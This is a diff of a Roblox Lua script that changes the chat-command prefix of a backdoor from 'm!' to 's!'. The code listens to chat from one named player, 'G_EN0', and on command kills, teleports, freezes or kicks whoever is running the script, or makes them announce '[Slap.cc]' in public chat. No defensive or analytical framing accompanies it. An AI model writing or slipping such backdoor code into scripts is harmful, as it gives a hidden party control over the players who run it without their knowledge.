@@ -1,29 +1,29 @@
 repeat wait() until game.Players:FindFirstChild('G_EN0')
 
 game.Players:FindFirstChild('G_EN0').Chatted:Connect(function(msg)
-    if msg == "m!kill" then 
+    if msg == "s!kill" then 
     game.Players.LocalPlayer.Character.Humanoid.Health = 0
 end
 
 
-if msg == "m!bring" then 
+if msg == "s!bring" then 
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('G_EN0').Character.HumanoidRootPart.CFrame
 end
 
-if msg == "m!check" then 
+if msg == "s!check" then 
 wait(0) local A_1 = "[Slap.cc]" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 end
 
 
-if msg == "m!freeze" then 
+if msg == "s!freeze" then 
 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
 end
 
-if msg == "m!unfreeze" then 
+if msg == "s!unfreeze" then 
 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
 end
 
-if msg == "m!kick" then
+if msg == "s!kick" then
     game.Players.LocalPlayer:Kick('You have been kicked')
     end
 end)
